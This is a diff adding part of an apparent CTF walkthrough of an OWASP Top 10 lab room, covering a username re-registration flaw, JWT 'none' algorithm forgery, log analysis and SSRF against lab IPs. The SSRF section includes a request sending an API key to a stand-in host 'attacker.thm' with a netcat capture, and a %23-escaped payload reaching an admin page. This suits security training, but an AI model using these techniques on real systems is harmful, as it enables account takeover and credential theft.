@@ -324,8 +324,283 @@ For this example, we'll look at a logic flaw within the authentication mechanism
 
 Many times, what happens is that developers forget to sanitise the input(username & password) given by the user in the code of their application, which can make them vulnerable to attacks like SQL injection. However, we will focus on a vulnerability that happens because of a developer's mistake but is very easy to exploit, i.e. re-registration of an existing user.
 
-Let's understand this with the help of an example, say there is an existing user with the name admin, and we want access to their account, so what we can do is try to re-register that username but with slight modification. We will enter " admin" without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user admin.
+Let's understand this with the help of an example, say there is an existing user with the name `admin`, and we want access to their account, so what we can do is try to re-register that username but with slight modification. We will enter " admin" without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the `admin` account. That new user will also be able to see all the content presented under the user `admin`.
 
 ### Challenge
 
+To see this in action, go to `http://10.10.202.133:8088` and try to register with `darren` as your username. You'll see that the user already exists, so try to register " darren" instead, and you'll see that you are now logged in and can see the content present only in darren's account, which in our case, is the flag that you need to retrieve.
+
+**What is the flag that you found in darren's account?**
+
+![Desktop View](/assets/img/OWASP/33.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/34.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/35.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/36.png){: width="700" height="400" }
+
+**Now try to do the same trick and see if you can log in as arthur.**
+
+**What is the flag that you found in arthur's account?**
+
+![Desktop View](/assets/img/OWASP/37.png){: width="700" height="400" }
+
+## 8. Software nad Data Integrity Failures
+
+**What is Integrity?**
+
+When talking about integrity, we refer to the capacity we have to ascertain that a piece of data remains unmodified. Integrity is essential in cybersecurity as we care about maintaining important data free from unwanted or malicious modifications. For example, say you are downloading the latest installer for an application. How can you be sure that while downloading it, it wasn't modified in transit or somehow got damaged by a transmission error?
+
+To overcome this problem, you will often see a hash sent alongside the file so that you can prove that the file you downloaded kept its integrity and wasn't modified in transit. A hash or digest is simply a number that results from applying a specific algorithm over a piece of data. When reading about hashing algorithms, you will often read about MD5, SHA1, SHA256 or many others available.
+
+### Software Integrity Failures
+
+Suppose you have a website that uses third-party libraries that are stored in some external servers that are out of your control. While this may sound a bit strange, this is actually a somewhat common practice. Take as an example jQuery, a commonly used javascript library. If you want, you can include jQuery in your website directly from their servers without actually downloading it by including the following line in the HTML code of your website:
+
+`<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>`
+When a user navigates to your website, its browser will read its HTML code and download jQuery from the specified external source.
+
+![Desktop View](/assets/img/OWASP/43.png){: width="700" height="400" }
+JS without integrity checks
+
+The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of `https://code.jquery.com/jquery-3.6.1.min.js` to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI), and you can read more about it here.
+
+The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version. Here's how that should look in HTML:
+
+`<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>`
+You can go to `https://www.srihash.org/` to generate hashes for any library if needed.
+
+### Challenge 
+
+![Desktop View](/assets/img/OWASP/38.png){: width="700" height="400" }
+
+### Data Integrity Failures
+
+Let's think of how web applications maintain sessions. Usually, when a user logs into an application, they will be assigned some sort of session token that will need to be saved on the browser for as long as the session lasts. This token will be repeated on each subsequent request so that the web application knows who we are. These session tokens can come in many forms but are usually assigned via cookies. Cookies are key-value pairs that a web application will store on the user's browser and that will be automatically repeated on each request to the website that issued them.
+
+For example, if you were creating a webmail application, you could assign a cookie to each user after logging in that contains their username. In subsequent requests, your browser would always send your username in the cookie so that your web application knows what user is connecting. This would be a terrible idea security-wise because, as we mentioned, cookies are stored on the user's browser, so if the user tampers with the cookie and changes the username, they could potentially impersonate someone else and read their emails! This application would suffer from a data integrity failure, as it trusts data that an attacker can tamper with.
+
+One solution to this is to use some integrity mechanism to guarantee that the cookie hasn't been altered by the user. To avoid re-inventing the wheel, we could use some token implementations that allow you to do this and deal with all of the cryptography to provide proof of integrity without you having to bother with it. One such implementation is **JSON Web Tokens (JWT)**.
+
+JWTs are very simple tokens that allow you to store key-value pairs on a token that provides integrity as part of the token. The idea is that you can generate tokens that you can give your users with the certainty that they won't be able to alter the key-value pairs and pass the integrity check. The structure of a JWT token is formed of 3 parts:
+
+![Desktop View](/assets/img/OWASP/39.png){: width="700" height="400" }
+
+- Header
+- Payload
+- Signature
+
+The header contains metadata indicating this is a JWT, and the signing algorithm in use is HS256. The payload contains the key-value pairs with the data that the web application wants the client to store. The signature is similar to a hash, taken to verify the payload's integrity. If you change the payload, the web application can verify that the signature won't match the payload and know that you tampered with the JWT. Unlike a simple hash, this signature involves the use of a secret key held by the server only, which means that if you change the payload, you won't be able to generate the matching signature unless you know the secret key.
+
+Notice that each of the 3 parts of the token is simply plaintext encoded with base64. You can use this online tool `https://appdevtools.com/base64-encoder-decoder` to encode/decode base64. Try decoding the header and payload of the following token:
+
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw`
+
+Note: The signature contains binary data, so even if you decode it, you won't be able to make much sense of it anyways.
+
+#### JWT and the None Algorithm
+
+A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago. As we have seen, JWT implements a signature to validate the integrity of the payload data. The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:
+
+1. Modify the header section of the token so that the alg header would contain the value none.
+
+2. Remove the signature part.
+
+Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes "admin" and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back. Notice how we removed the signature part but kept the dot at the end.
+
+![Desktop View](/assets/img/OWASP/40.png){: width="700" height="400" }
+
+### Challenge 
+
+Navigate to `http://10.10.202.133:8089/` and follow the instructions in the questions below.
+
+**Try logging into the application as guest. What is guest's account password?**
+
+![Desktop View](/assets/img/OWASP/44.png){: width="700" height="400" }
+
+---
+
+If your login was successful, you should now have a JWT stored as a cookie in your browser. Press F12 to bring out the Developer Tools.
+
+Depending on your browser, you will be able to edit cookies from the following tabs:
+
+**Firefox**
+
+![Desktop View](/assets/img/OWASP/41.png){: width="700" height="400" }
+
+**Chrome**
+
+![Desktop View](/assets/img/OWASP/42.png){: width="700" height="400" }
+
+**What is the name of the website's cookie containing a JWT token?**
+
+![Desktop View](/assets/img/OWASP/45.png){: width="700" height="400" }
+
+**Use the knowledge gained in this task to modify the JWT token so that the application thinks you are the user "admin".**
+
+Open a word document. Copy the “Value” and paste the entire code to the document. It should look like this:
+
+`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjg2MzIxNjI2fQ.L159cLhW34u6BYodwGSJwHftLw34J-zKQF9Xo1uYBVA`
+
+Next, you need to use the head and payload. If you recall from the task the header is up to the “.”, then the payload is up to the next “.”, don’t worry the signature we won’t need it.
+
+Go to `https://appdevtools.com/base64-encoder-decoder` and DECODE the header and payload separately.
+
+
+Copy and paste the decoded information and change the “HS256” to “none” in the header, then change “guest” to “admin”. Now its time to encode this information. Take the result of the two codes and combine them. It should look like this:
+
+![Desktop View](/assets/img/OWASP/46.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/47.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/48.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/49.png){: width="700" height="400" }
+
+Copy and paste the pair into the value of the cookie.
+
+
+Once you insert the code into the cookie, refresh the page to get the flag.
+
+
+**What is the flag presented to the admin user?**
+
+![Desktop View](/assets/img/OWASP/50.png){: width="700" height="400" }
+
+---
+
+## 9. Security Logging and Monitoring Failures
+
+When web applications are set up, every action performed by the user should be logged. Logging is important because, in the event of an incident, the attackers' activities can be traced. Once their actions are traced, their risk and impact can be determined. Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications. The more significant impacts of these include:
+
+- **Regulatory damage:** if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.
+
+- **Risk of further attacks:** an attacker's presence may be undetected without logging. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.
+
+The information stored in logs should include the following:
+
+- HTTP status codes
+
+- Time Stamps
+
+- Usernames
+
+- API endpoints/page locations
+
+- IP addresses
+
+These logs have some sensitive information, so it's important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.
+
+As you may have noticed, logging is more important after a breach or incident has occurred. The ideal case is to have monitoring in place to detect any suspicious activity. The aim of detecting this suspicious activity is to either stop the attacker completely or reduce the impact they've made if their presence has been detected much later than anticipated. Common examples of suspicious activity include:
+
+- Multiple unauthorised attempts for a particular action (usually authentication attempts or access to unauthorised resources, e.g. admin pages)
+
+- Requests from anomalous IP addresses or locations: while this can indicate that someone else is trying to access a particular user's account, it can also have a false positive rate.
+
+- Use of automated tools: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests. This can indicate that an attacker is using automated tooling.
+
+- Common payloads: in web applications, it's common for attackers to use known payloads. Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.
+
+Just detecting suspicious activity isn't helpful. This suspicious activity needs to be rated according to the impact level. For example, certain actions will have a higher impact than others. These higher-impact actions need to be responded to sooner; thus, they should raise alarms to get the relevant parties' attention.
+
+## Challenge
+
+Put this knowledge to practice by analysing the provided sample log file. You can download it by clicking the Download Task Files button at the top of the task.
+
+![Desktop View](/assets/img/OWASP/51.png){: width="700" height="400" }
+
+**What IP address is the attacker using?**
+
+Notice the IP address that reoccurs in the span of 15 seconds? That is the attack and the IP address is the answer to the first question. The next thing to notice is the different attempts. Same IP address, different login names, in 15 seconds. This is the key to question two. It is a “Brute Force” attack.
+
+**Answer: 49.99.13.16**
+
+**What kind of attack is being carried out?**
+
+**Brute Force**
+
+---
+
+## Server-Side Request Forgery
+
+This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.
+
+Think, for example, of a web application that uses an external API to send SMS notifications to its clients. For each email, the website needs to make a web request to the SMS provider's server to send the content of the message to be sent. Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API. The API key serves as an authentication token and allows the provider to know to whom to bill each message. The application would work like this:
+
+![Desktop View](/assets/img/OWASP/52.png){: width="700" height="400" }
+
+By looking at the diagram above, it is easy to see where the vulnerability lies. The application exposes the server parameter to the users, which defines the server name of the SMS service provider. If the attacker wanted, they could simply change the value of the server to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider. As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense. To achieve this, the attacker would only need to make the following request to your website:
+
+`https://www.mysite.com/sms?server=attacker.thm&msg=ABC`
+
+This would make the vulnerable web application make a request to:
+
+`https://attacker.thm/api/send?msg=ABC `
+
+You could then just capture the contents of the request using Netcat:
+
+```bash
+user@attackbox$ nc -lvp 80
+Listening on 0.0.0.0 80
+Connection received on 10.10.1.236 43830
+GET /:8087/public-docs/123.pdf HTTP/1.1
+Host: 10.10.10.11
+User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
+Accept: */*
+```
+
+This is a really basic case of SSRF. If this doesn't look that scary, SSRF can actually be used to do much more. In general, depending on the specifics of each scenario, SSRF can be used for:
+
+- Enumerate internal networks, including IP addresses and ports.
+
+- Abuse trust relationships between servers and gain access to otherwise restricted services.
+
+- Interact with some non-HTTP services to get remote code execution (RCE).
+
+Let's quickly look at how we can use SSRF to abuse some trust relationships.
+
+### Challenge
+
+Navigate to `http://10.10.136.154:8087/`, where you'll find a simple web application. After exploring a bit, you should see an admin area, which will be our main objective. Follow the instructions on the following questions to gain access to the website's restricted area!
+
+**Explore the website. What is the only host allowed to access the admin area?**
+
+![Desktop View](/assets/img/OWASP/53.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/54.png){: width="700" height="400" }
+
+**Check the "Download Resume" button. Where does the server parameter point to?**
+
+![Desktop View](/assets/img/OWASP/55.png){: width="700" height="400" }
+
+**Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?**
+
+![Desktop View](/assets/img/OWASP/56.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/57.png){: width="700" height="400" }
+
+![Desktop View](/assets/img/OWASP/58.png){: width="700" height="400" }
+
+#### Going the Extra Mile: There's a way to use SSRF to gain access to the site's admin area. Can you find it?
+
+We already know from the first question that only “localhost” has access to the area. So we are going to change the server to the localhost and admin by using:
+
+`http://localhost:8087/admin`
+
+(Trying `?server=http://localhost:8087` confirms that SSRF is possible)
+
+However when adding /admin it breaks. Because it still has &id=123 and adding the /admin makes it an invaild request and fails.
+
+If you drop the id=75482342 the link will not work.
+
+So the fix for this is similar to a SQL injection and to break up the server and id in the link (obfuscation). Some forums called it “escaping the # (hash)”.
+
+Instead of just using a url fragment like # we can obfuscate it because # normally isn't sent in HTTP requests we can encode it with `%23`. 
+
+Turning our full url into `http://10.10.190.86:8087/download?server=http://localhost:8087/admin%23&id=75482342`.
+
+Which will then give access to the flag.
+
+![Desktop View](/assets/img/OWASP/59.png){: width="700" height="400" }
 
